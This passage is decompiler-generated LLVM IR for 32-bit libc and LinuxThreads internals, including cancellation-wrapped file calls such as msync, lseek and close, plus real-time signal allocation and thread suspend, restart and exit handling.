  %v2_804d4de = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d4de, i32* @ebx, align 4
  ret i32 %v0_804d4dc
}

define i32 @msync(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_804d4e4 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d4eb = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d4e4)
  %v3_804d4ff = call i32 @__libc_msync(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %v3_804d4ff, i32* @ebx, align 4
  %v3_804d50a = load i32, i32* %stack_var_-8, align 4
  %v2_804d50e = trunc i32 %v3_804d50a to i8
  %v3_804d50e = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d50e, i32 0)
  %v0_804d516 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d516
}

define i32 @lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_804d51f = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v3_804d52e = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d51f)
  %v0_804d537 = load i32, i32* @esi, align 4
  %v0_804d538 = load i32, i32* @ebx, align 4
  %v4_804d53d = call i32 @__libc_lseek64(i32 %arg1, i32 %v0_804d538, i32 %v0_804d537, i32 %arg4)
  %v3_804d547 = load i32, i32* %stack_var_-12, align 4
  store i32 %v4_804d53d, i32* @ebx, align 4
  %v0_804d54d = load i32, i32* @edx, align 4
  store i32 %v0_804d54d, i32* @esi, align 4
  %v2_804d54f = trunc i32 %v3_804d547 to i8
  %v3_804d54f = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d54f, i32 0)
  %v0_804d557 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d557
}

define i32 @lseek(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_804d562 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d569 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d562)
  %v3_804d57d = call i32 @__GI___libc_lseek(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_804d57d, i32* @ebx, align 4
  %v3_804d588 = load i32, i32* %stack_var_-8, align 4
  %v2_804d58c = trunc i32 %v3_804d588 to i8
  %v3_804d58c = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d58c, i32 0)
  %v0_804d594 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d594
}

define i32 @fsync(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d59c = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d5a3 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d59c)
  store i32 1, i32* @ecx, align 4
  %v1_804d5ad = call i32 @__libc_fsync(i32 %arg1)
  store i32 %v1_804d5ad, i32* @ebx, align 4
  %v3_804d5b8 = load i32, i32* %stack_var_-8, align 4
  %v2_804d5bc = trunc i32 %v3_804d5b8 to i8
  %v3_804d5bc = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d5bc, i32 0)
  %v0_804d5c4 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d5c4
}

define i32 @fcntl(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_804d5cc = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d5d3 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d5cc)
  %v3_804d5ef = call i32 @__libc_fcntl(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %v3_804d5ef, i32* @ebx, align 4
  %v3_804d5fa = load i32, i32* %stack_var_-8, align 4
  %v2_804d5fe = trunc i32 %v3_804d5fa to i8
  %v3_804d5fe = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d5fe, i32 0)
  %v0_804d606 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d606
}

define i32 @close(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d60a = load i32, i32* @ebx, align 4
  store i32 %v0_804d60a, i32* %stack_var_-4, align 4
  %v2_804d60e = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d615 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d60e)
  %v1_804d61f = call i32 @__libc_close(i32 %arg1)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v1_804d61f, i32* @ebx, align 4
  %v3_804d62a = load i32, i32* %stack_var_-8, align 4
  %v2_804d62e = trunc i32 %v3_804d62a to i8
  %v3_804d62e = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d62e, i32 0)
  %v0_804d636 = load i32, i32* @ebx, align 4
  %v2_804d638 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d638, i32* @ebx, align 4
  ret i32 %v0_804d636

; uselistorder directives
  uselistorder i32 (i8, i32)* @__GI_pthread_setcanceltype, { 44, 45, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 52, 53, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 38, 39, 50, 51, 46, 47, 42, 43, 48, 49, 30, 31, 32, 33, 34, 35, 36, 37, 40, 41 }
}

define i32 @__libc_current_sigrtmin() local_unnamed_addr {
entry:
  %v0_804d63c = load i32, i32* @global_var_8062b58.173, align 8
  ret i32 %v0_804d63c
}

define i32 @__libc_current_sigrtmax() local_unnamed_addr {
entry:
  %v0_804d642 = load i32, i32* @global_var_8062b5c.174, align 4
  ret i32 %v0_804d642
}

define i32 @__libc_allocate_rtsig(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804d648 = load i32, i32* @global_var_8062b58.173, align 8
  %v1_804d64e = add i32 %v0_804d648, 1
  %v10_804d64e = icmp eq i32 %v1_804d64e, 0
  br i1 %v10_804d64e, label %dec_label_pc_804d67a, label %dec_label_pc_804d653

dec_label_pc_804d653:                             ; preds = %entry
  %v0_804d653 = load i32, i32* @global_var_8062b5c.174, align 4
  %v8_804d65b = icmp sgt i32 %v0_804d648, %v0_804d653
  br i1 %v8_804d65b, label %dec_label_pc_804d67a, label %dec_label_pc_804d65d

dec_label_pc_804d65d:                             ; preds = %dec_label_pc_804d653
  %v4_804d65d = icmp eq i32 %arg1, 0
  br i1 %v4_804d65d, label %dec_label_pc_804d66e, label %dec_label_pc_804d664

dec_label_pc_804d664:                             ; preds = %dec_label_pc_804d65d
  store i32 %v1_804d64e, i32* @global_var_8062b58.173, align 8
  br label %dec_label_pc_804d67d

dec_label_pc_804d66e:                             ; preds = %dec_label_pc_804d65d
  %v1_804d66e = add i32 %v0_804d653, -1
  store i32 %v1_804d66e, i32* @global_var_8062b5c.174, align 4
  br label %dec_label_pc_804d67d

dec_label_pc_804d67a:                             ; preds = %dec_label_pc_804d653, %entry
  br label %dec_label_pc_804d67d

dec_label_pc_804d67d:                             ; preds = %dec_label_pc_804d66e, %dec_label_pc_804d664, %dec_label_pc_804d67a
  %v0_804d67d = phi i32 [ %v0_804d653, %dec_label_pc_804d66e ], [ %v0_804d648, %dec_label_pc_804d664 ], [ -1, %dec_label_pc_804d67a ]
  ret i32 %v0_804d67d

; uselistorder directives
  uselistorder label %dec_label_pc_804d67d, { 2, 0, 1 }
}

define i32 @pthread_equal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v15_804d684 = icmp eq i32 %arg1, %arg2
  %v1_804d688 = zext i1 %v15_804d684 to i32
  ret i32 %v1_804d688
}

define i32 @pthread_handle_sigdebug() local_unnamed_addr {
entry:
  %v0_804d68f = load i32, i32* @eax, align 4
  ret i32 %v0_804d68f
}

define i32 @__pthread_setconcurrency(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_80633a4.175, align 4
  ret i32 0
}

define i32 @__pthread_getconcurrency() local_unnamed_addr {
entry:
  %v0_804d69c = load i32, i32* @global_var_80633a4.175, align 4
  ret i32 %v0_804d69c
}

define i32 @__pthread_timedsuspend_new(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp5 = call i64 @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d6a2 = load i32, i32* @ebx, align 4
  store i32 %v0_804d6a2, i32* %stack_var_-4, align 4
  %v2_804d6ab = ptrtoint i32* %stack_var_-432 to i32
  %v3_804d6b0 = call i32 @__sigsetjmp(i32 %v2_804d6ab, i32* inttoptr (i32 1 to i32*))
  store i32 1, i32* @edx, align 4
  %v1_804d6bd = icmp eq i32 %v3_804d6b0, 0
  %v1_804d6bf = icmp eq i1 %v1_804d6bd, false
  br i1 %v1_804d6bf, label %entry.dec_label_pc_804d7a4_crit_edge, label %dec_label_pc_804d6c5

entry.dec_label_pc_804d7a4_crit_edge:             ; preds = %entry
  %.pre = add i32 %arg1, 36
  %.pre4 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_804d7a4

dec_label_pc_804d6c5:                             ; preds = %entry
  %tmp7 = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v2_804d6d3 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_804d6d3, i32* @ebx, align 4
  %v2_804d6da = add i32 %arg1, 36
  %v3_804d6da = inttoptr i32 %v2_804d6da to i32*
  store i32 %v2_804d6ab, i32* %v3_804d6da, align 4
  %v0_804d6dd = load i32, i32* %edx.global-to-local, align 4
  %v1_804d6dd = add i32 %v0_804d6dd, 32
  %v2_804d6dd = inttoptr i32 %v1_804d6dd to i32*
  store i32 0, i32* %v2_804d6dd, align 4
  %v1_804d6e5 = call i32 @sigemptyset(i32 %v2_804d6d3)
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_804d6ec = load i32, i32* @global_var_8062a88.170, align 8
  %v2_804d6f3 = call i32 @__GI_sigaddset(i32 %v2_804d6d3, i32 %v0_804d6ec)
  %v2_804d6fb = ptrtoint i32* %stack_var_-276 to i32
  %v3_804d706 = bitcast i32* %stack_var_-148 to %_TYPEDEF_sigset_t*
  %v4_804d706 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_804d706, i32 %v2_804d6fb)
  %v2_804d712 = ptrtoint i32* %stack_var_-12 to i32
  %v7_804d726 = mul nsw i64 %tmp5, 1000
  %v8_804d726 = trunc i64 %v7_804d726 to i32
  %v2_804d779 = ptrtoint i32* %stack_var_-20 to i32
  %v1_804d731 = add i32 %tmp7, 4
  %v2_804d731 = inttoptr i32 %v1_804d731 to i32*
  br label %dec_label_pc_804d70e

dec_label_pc_804d70e:                             ; preds = %dec_label_pc_804d775, %dec_label_pc_804d6c5
  %v0_804d70e = load i32, i32* @ecx, align 4
  %v4_804d71a = call i32 @gettimeofday(i32 %v2_804d712, i32 0, i32 %v0_804d70e, i32 %v0_804d70e)
  %v3_804d731 = load i32, i32* %v2_804d731, align 4
  store i32 %v3_804d731, i32* %edx.global-to-local, align 4
  %v2_804d734 = load i32, i32* %arg2, align 4
  %v4_804d736 = load i32, i32* %stack_var_-12, align 4
  %v5_804d736 = sub i32 %v2_804d734, %v4_804d736
  %v2_804d73d = sub i32 %v3_804d731, %v8_804d726
  %v13_804d73d = icmp slt i32 %v2_804d73d, 0
  store i32 %v2_804d73d, i32* %edx.global-to-local, align 4
  %v1_804d752 = icmp eq i1 %v13_804d73d, false
  br i1 %v1_804d752, label %dec_label_pc_804d76b, label %dec_label_pc_804d754

dec_label_pc_804d754:                             ; preds = %dec_label_pc_804d70e
  %v1_804d761 = add i32 %v5_804d736, -1
  br label %dec_label_pc_804d76b

dec_label_pc_804d76b:                             ; preds = %dec_label_pc_804d70e, %dec_label_pc_804d754
  %storemerge = phi i32 [ %v1_804d761, %dec_label_pc_804d754 ], [ %v5_804d736, %dec_label_pc_804d70e ]
  %v3_804d76b = phi i32 [ %v1_804d761, %dec_label_pc_804d754 ], [ %v5_804d736, %dec_label_pc_804d70e ]
  store i32 %storemerge, i32* %stack_var_-20, align 4
  %v5_804d76b = icmp slt i32 %v3_804d76b, 0
  br i1 %v5_804d76b, label %dec_label_pc_804d78d, label %dec_label_pc_804d775

dec_label_pc_804d775:                             ; preds = %dec_label_pc_804d76b
  %v2_804d781 = call i32 @__libc_nanosleep(i32 %v2_804d779, i32 0)
  %v1_804d789 = icmp eq i32 %v2_804d781, 0
  %v1_804d78b = icmp eq i1 %v1_804d789, false
  br i1 %v1_804d78b, label %dec_label_pc_804d70e, label %dec_label_pc_804d78d

dec_label_pc_804d78d:                             ; preds = %dec_label_pc_804d775, %dec_label_pc_804d76b
  %v3_804d79a = bitcast i32* %stack_var_-276 to %_TYPEDEF_sigset_t*
  %v4_804d79a = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_804d79a, i32 0)
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_804d7a4

dec_label_pc_804d7a4:                             ; preds = %entry.dec_label_pc_804d7a4_crit_edge, %dec_label_pc_804d78d
  %v2_804d7ab.pre-phi = phi i32* [ %.pre4, %entry.dec_label_pc_804d7a4_crit_edge ], [ %v3_804d6da, %dec_label_pc_804d78d ]
  store i32 %arg1, i32* @ecx, align 4
  store i32 0, i32* %v2_804d7ab.pre-phi, align 4
  %v0_804d7b8 = load i32, i32* @edx, align 4
  %v2_804d7ba = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d7ba, i32* @ebx, align 4
  ret i32 %v0_804d7b8

; uselistorder directives
  uselistorder i32 %v1_804d761, { 1, 0 }
  uselistorder i32 %v5_804d736, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 1, 0 }
  uselistorder i32 (i32, i32*)* @__sigsetjmp, { 1, 0 }
  uselistorder i32 %arg1, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804d7a4, { 1, 0 }
  uselistorder label %dec_label_pc_804d76b, { 1, 0 }
}

define i32 @__pthread_restart_new(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804d7bf = load i32, i32* @global_var_8062a88.170, align 8
  %v1_804d7c9 = add i32 %arg1, 20
  %v2_804d7c9 = inttoptr i32 %v1_804d7c9 to i32*
  %v3_804d7c9 = load i32, i32* %v2_804d7c9, align 4
  %v2_804d7cc = call i32 @kill(i32 %v3_804d7c9, i32 %v0_804d7bf)
  ret i32 %v2_804d7cc
}

define i32 @__pthread_wait_for_restart_signal(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d7d5 = load i32, i32* @esi, align 4
  %v0_804d7d6 = load i32, i32* @ebx, align 4
  store i32 %v0_804d7d6, i32* %stack_var_-8, align 4
  %v2_804d7dd = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_804d7dd, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_804d7ed = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* null, i32 %v2_804d7dd)
  %v1_804d7fb = call i32 @__GI_sigdelset(i32 %v2_804d7dd)
  %v0_804d803 = load i32, i32* @esi, align 4
  %v1_804d803 = add i32 %v0_804d803, 32
  %v2_804d803 = inttoptr i32 %v1_804d803 to i32*
  store i32 0, i32* %v2_804d803, align 4
  %v1_804d812 = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  br label %dec_label_pc_804d80a

dec_label_pc_804d80a:                             ; preds = %dec_label_pc_804d80a, %entry
  %v2_804d812 = call i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %v1_804d812)
  %v0_804d817 = load i32, i32* @esi, align 4
  %v1_804d817 = add i32 %v0_804d817, 32
  %v2_804d817 = inttoptr i32 %v1_804d817 to i32*
  %v3_804d817 = load i32, i32* %v2_804d817, align 4
  %v1_804d81d = load i32, i32* @global_var_8062a88.170, align 8
  %v12_804d81d = icmp eq i32 %v3_804d817, %v1_804d81d
  %v1_804d823 = icmp eq i1 %v12_804d81d, false
  br i1 %v1_804d823, label %dec_label_pc_804d80a, label %dec_label_pc_804d825

dec_label_pc_804d825:                             ; preds = %dec_label_pc_804d80a
  %v2_804d82b = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d82b, i32* @ebx, align 4
  store i32 %v0_804d7d5, i32* @esi, align 4
  ret i32 %v3_804d817

; uselistorder directives
  uselistorder i32 %v3_804d817, { 1, 0 }
  uselistorder i32 %v2_804d7dd, { 1, 0, 2 }
  uselistorder i32 (%_TYPEDEF_sigset_t*)* @__libc_sigsuspend, { 1, 0 }
}

define i32 @suspend.6() local_unnamed_addr {
entry:
  %v0_804d831 = load i32, i32* @eax, align 4
  %v1_804d832 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_804d831)
  ret i32 %v1_804d832
}

define i32 @__pthread_find_self() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_804d83b = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_804d83b, i32* @ecx, align 4
  br label %dec_label_pc_804d847

dec_label_pc_804d844:                             ; preds = %dec_label_pc_804d84e, %dec_label_pc_804d847
  %v1_804d844 = add i32 %v0_804d844, 16
  br label %dec_label_pc_804d847

dec_label_pc_804d847:                             ; preds = %entry, %dec_label_pc_804d844
  %v0_804d844 = phi i32 [ ptrtoint (i32* @global_var_805e6c0.176 to i32), %entry ], [ %v1_804d844, %dec_label_pc_804d844 ]
  store i32 %v0_804d844, i32* @edx, align 4
  %v1_804d847 = add i32 %v0_804d844, 8
  %v2_804d847 = inttoptr i32 %v1_804d847 to i32*
  %v3_804d847 = load i32, i32* %v2_804d847, align 4
  %v6_804d84c = icmp ugt i32 %v1_804d83b, %v3_804d847
  br i1 %v6_804d84c, label %dec_label_pc_804d844, label %dec_label_pc_804d84e

dec_label_pc_804d84e:                             ; preds = %dec_label_pc_804d847
  %v2_804d84e = add i32 %v0_804d844, 12
  %v3_804d84e = inttoptr i32 %v2_804d84e to i32*
  %v4_804d84e = load i32, i32* %v3_804d84e, align 4
  %v10_804d84e = icmp ult i32 %v1_804d83b, %v4_804d84e
  br i1 %v10_804d84e, label %dec_label_pc_804d844, label %dec_label_pc_804d853

dec_label_pc_804d853:                             ; preds = %dec_label_pc_804d84e
  ret i32 %v3_804d847

; uselistorder directives
  uselistorder i32 %v0_804d844, { 1, 2, 3, 0 }
  uselistorder i32 %v1_804d83b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d847, { 1, 0 }
}

define i32 @thread_self.7(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_804d854 = load i32, i32* @esp, align 4
  %v1_804d854 = load i32, i32* @global_var_806338c.133, align 4
  %v7_804d854 = icmp ult i32 %v0_804d854, %v1_804d854
  %v1_804d861 = icmp eq i1 %v7_804d854, false
  br i1 %v1_804d861, label %dec_label_pc_804d892, label %dec_label_pc_804d863

dec_label_pc_804d863:                             ; preds = %entry
  %v1_804d863 = load i32, i32* @global_var_8063390.134, align 16
  %v7_804d863 = icmp ult i32 %v0_804d854, %v1_804d863
  br i1 %v7_804d863, label %dec_label_pc_804d878, label %dec_label_pc_804d86b

dec_label_pc_804d86b:                             ; preds = %dec_label_pc_804d863
  %v1_804d86b = load i32, i32* @global_var_8063394.135, align 4
  %v7_804d86b = icmp ult i32 %v0_804d854, %v1_804d86b
  br i1 %v7_804d86b, label %dec_label_pc_804d892, label %dec_label_pc_804d878

dec_label_pc_804d878:                             ; preds = %dec_label_pc_804d86b, %dec_label_pc_804d863
  %v0_804d878 = load i32, i32* @global_var_80679f0.137, align 16
  %v1_804d878 = icmp eq i32 %v0_804d878, 0
  br i1 %v1_804d878, label %dec_label_pc_804d886, label %dec_label_pc_804d881

dec_label_pc_804d881:                             ; preds = %dec_label_pc_804d878
  %v0_804d881 = call i32 @__pthread_find_self()
  br label %dec_label_pc_804d886

dec_label_pc_804d886:                             ; preds = %dec_label_pc_804d878, %dec_label_pc_804d881
  %v2_804d88c = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804d892

dec_label_pc_804d892:                             ; preds = %dec_label_pc_804d86b, %entry, %dec_label_pc_804d886
  %v0_804d892 = phi i32 [ ptrtoint (i32* @global_var_80628a0.136 to i32), %dec_label_pc_804d86b ], [ ptrtoint (i32* @global_var_80626c0 to i32), %entry ], [ %v2_804d88c, %dec_label_pc_804d886 ]
  ret i32 %v0_804d892

; uselistorder directives
  uselistorder label %dec_label_pc_804d892, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d886, { 1, 0 }
}

define i32 @pthread_onexit_process(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %v0_804d893 = load i32, i32* @ebx, align 4
  %v0_804d89a = load i32, i32* @global_var_8062a84.142, align 4
  %v2_804d89a = icmp slt i32 %v0_804d89a, 0
  br i1 %v2_804d89a, label %entry.dec_label_pc_804d920_crit_edge, label %dec_label_pc_804d8a3

entry.dec_label_pc_804d920_crit_edge:             ; preds = %entry
  %v0_804d927.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804d920

dec_label_pc_804d8a3:                             ; preds = %entry
  %v1_804d8a3 = call i32 @thread_self.7(i32 %v0_804d893)
  store i32 %v1_804d8a3, i32* @ebx, align 4
  store i32 %v1_804d8a3, i32* %stack_var_-152, align 4
  %v2_804d8c1 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_804d8c1

dec_label_pc_804d8c1:                             ; preds = %dec_label_pc_804d8dd, %dec_label_pc_804d8a3
  %v0_804d8cc = load i32, i32* @global_var_8062a84.142, align 4
  store i32 %v0_804d8cc, i32* %stack_var_-188, align 4
  %v3_804d8d2 = call i32 @__libc_write(i32 %v0_804d8cc, i32 %v2_804d8c1, i32 148)
  %v8_804d8da = icmp eq i32 %v3_804d8d2, -1
  %v1_804d8db = icmp eq i1 %v8_804d8da, false
  br i1 %v1_804d8db, label %dec_label_pc_804d8e7, label %dec_label_pc_804d8dd

dec_label_pc_804d8dd:                             ; preds = %dec_label_pc_804d8c1
  %v0_804d8dd = load i32, i32* %stack_var_-188, align 4
  %v1_804d8dd = call i32 @__errno_location(i32 %v0_804d8dd)
  %v1_804d8e2 = inttoptr i32 %v1_804d8dd to i32*
  %v2_804d8e2 = load i32, i32* %v1_804d8e2, align 4
  %v11_804d8e2 = icmp eq i32 %v2_804d8e2, 4
  br i1 %v11_804d8e2, label %dec_label_pc_804d8c1, label %dec_label_pc_804d8e7

dec_label_pc_804d8e7:                             ; preds = %dec_label_pc_804d8dd, %dec_label_pc_804d8c1
  %v0_804d8e7 = load i32, i32* @ebx, align 4
  store i32 %v0_804d8e7, i32* @eax, align 4
  %v0_804d8e9 = call i32 @suspend.6()
  %v0_804d8ee = load i32, i32* @ebx, align 4
  %v1_804d8ee = load i32, i32* bitcast (i32** @global_var_8062a80.143 to i32*), align 128
  %v12_804d8ee = icmp eq i32 %v0_804d8ee, %v1_804d8ee
  %v1_804d8f4 = icmp eq i1 %v12_804d8ee, false
  br i1 %v1_804d8f4, label %dec_label_pc_804d8e7.dec_label_pc_804d920_crit_edge, label %dec_label_pc_804d8f6

dec_label_pc_804d8e7.dec_label_pc_804d920_crit_edge: ; preds = %dec_label_pc_804d8e7
  br label %dec_label_pc_804d920

dec_label_pc_804d8f6:                             ; preds = %dec_label_pc_804d8e7
  %v0_804d8fe = load i32, i32* @global_var_80628b4.139, align 4
  store i32 %v0_804d8fe, i32* %stack_var_-188, align 4
  %v3_804d904 = call i32 @waitpid(i32 %v0_804d8fe, i32 0, i32 -2147483648)
  store i32 0, i32* @global_var_8063394.135, align 4
  store i32 0, i32* @global_var_8063390.134, align 16
  br label %dec_label_pc_804d920

dec_label_pc_804d920:                             ; preds = %entry.dec_label_pc_804d920_crit_edge, %dec_label_pc_804d8e7.dec_label_pc_804d920_crit_edge, %dec_label_pc_804d8f6
  %v0_804d927 = phi i32 [ %v0_804d8e9, %dec_label_pc_804d8e7.dec_label_pc_804d920_crit_edge ], [ %v0_804d927.pre, %entry.dec_label_pc_804d920_crit_edge ], [ %v3_804d904, %dec_label_pc_804d8f6 ]
  store i32 %v0_804d893, i32* @ebx, align 4
  ret i32 %v0_804d927

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d920, { 2, 1, 0 }
}

define i32 @__GI_pthread_self(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804d928 = call i32 @thread_self.7(i32 ptrtoint (i32* @0 to i32))
  %v1_804d92d = add i32 %v1_804d928, 16
  %v2_804d92d = inttoptr i32 %v1_804d92d to i32*
  %v3_804d92d = load i32, i32* %v2_804d92d, align 4
  ret i32 %v3_804d92d
}

define i32 @__pthread_reset_main_thread() local_unnamed_addr {
entry:
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804d931 = load i32, i32* @ebx, align 4
  store i32 %v0_804d931, i32* %stack_var_-4, align 4
  %v1_804d935 = call i32 @thread_self.7(i32 %v0_804d931)
  %v0_804d93a = load i32, i32* @global_var_8062a84.142, align 4
  %v10_804d93a = icmp eq i32 %v0_804d93a, -1
  store i32 %v1_804d935, i32* @ebx, align 4
  br i1 %v10_804d93a, label %dec_label_pc_804d996, label %dec_label_pc_804d945

dec_label_pc_804d945:                             ; preds = %entry
  %v0_804d948 = load i32, i32* @global_var_8063390.134, align 16
  %v1_804d94e = call i32 @free(i32 %v0_804d948)
  store i32 0, i32* @global_var_8063394.135, align 4
  %v0_804d95e = load i32, i32* @global_var_8062a84.142, align 4
  store i32 0, i32* @global_var_8063390.134, align 16
  %v1_804d96e = call i32 @__libc_close(i32 %v0_804d95e)
  %v0_804d974 = load i32, i32* @global_var_8067a08.177, align 8
  %v1_804d97a = call i32 @__libc_close(i32 %v0_804d974)
  store i32 -1, i32* @global_var_8067a08.177, align 8
  store i32 -1, i32* @global_var_8062a84.142, align 4
  br label %dec_label_pc_804d996

dec_label_pc_804d996:                             ; preds = %entry, %dec_label_pc_804d945
  %v0_804d996 = phi i32 [ %tmp3, %entry ], [ %v0_804d974, %dec_label_pc_804d945 ]
  %v1_804d996 = call i32 @__libc_getpid(i32 %v0_804d996)
  %v1_804d99b = load i32, i32* @ebx, align 4
  %v2_804d99b = add i32 %v1_804d99b, 20
  %v3_804d99b = inttoptr i32 %v2_804d99b to i32*
  store i32 %v1_804d996, i32* %v3_804d99b, align 4
  %v0_804d99e = load i32, i32* @ebx, align 4
  store i32 %v0_804d99e, i32* bitcast (i32** @global_var_8062a80.143 to i32*), align 128
  %v2_804d9a4 = inttoptr i32 %v0_804d99e to i32*
  store i32 %v0_804d99e, i32* %v2_804d9a4, align 4
  %v0_804d9a6 = load i32, i32* @ebx, align 4
  %v2_804d9a6 = add i32 %v0_804d9a6, 4
  %v3_804d9a6 = inttoptr i32 %v2_804d9a6 to i32*
  store i32 %v0_804d9a6, i32* %v3_804d9a6, align 4
  %v0_804d9a9 = load i32, i32* @ebx, align 4
  %v1_804d9a9 = add i32 %v0_804d9a9, 68
  %v2_804d9a9 = inttoptr i32 %v1_804d9a9 to i32*
  store i32 ptrtoint (i32* @global_var_80653f8.178 to i32), i32* %v2_804d9a9, align 4
  %v0_804d9b0 = load i32, i32* @ebx, align 4
  %v1_804d9b0 = add i32 %v0_804d9b0, 76
  %v2_804d9b0 = inttoptr i32 %v1_804d9b0 to i32*
  store i32 ptrtoint (i32* @global_var_80653fc.179 to i32), i32* %v2_804d9b0, align 4
  %v2_804d9b9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d9b9, i32* @ebx, align 4
  ret i32 %v1_804d996

; uselistorder directives
  uselistorder i32 %v0_804d9a6, { 1, 0 }
  uselistorder i32 %v0_804d99e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d996, { 1, 0 }
}

define i32 @__pthread_kill_other_threads_np() local_unnamed_addr {
entry:
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %v2_804d9c6 = call i32 @pthread_onexit_process(i32 0, i32 0)
  %v0_804d9cb = call i32 @__pthread_reset_main_thread()
  %v2_804d9d1 = ptrtoint i32* %stack_var_-140 to i32
  %v2_804d9d5 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804d9d5, i32* @ebx, align 4
  %v1_804d9da = call i32 @sigemptyset(i32 %v2_804d9d1)
  store i32 0, i32* %stack_var_-144, align 4
  %v0_804d9f8 = load i32, i32* @global_var_8062a88.170, align 8
  %v4_804d9fe = call i32 @__libc_sigaction(i32 %v0_804d9f8, i32* nonnull %stack_var_-144, i32 0)
  %v0_804da09 = load i32, i32* @global_var_8062a8c.154, align 4
